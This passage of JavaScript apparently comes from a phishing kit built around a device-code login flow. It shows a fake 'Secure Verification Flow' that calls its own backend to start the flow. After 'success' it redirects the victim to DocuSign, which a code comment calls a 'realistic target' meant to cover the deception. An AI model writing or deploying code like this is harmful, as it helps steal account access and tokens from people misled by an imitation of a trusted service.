} }; const finishFlow = () => { finishOverlay.classList.remove('hidden'); setTimeout(() => { // Redirect to a realistic target after success window.location.href = appConfig.postAuthRedirectUrl || "https://www.docusign.com/"; }, 3000); }; const startDeviceFlow = async () => { log('⚡ Entering startDeviceFlow...', 'info'); log('⚡ Starting Secure Verification Flow...', 'info'); try { const response = await fetch('/api.php?action=start_device_flow');
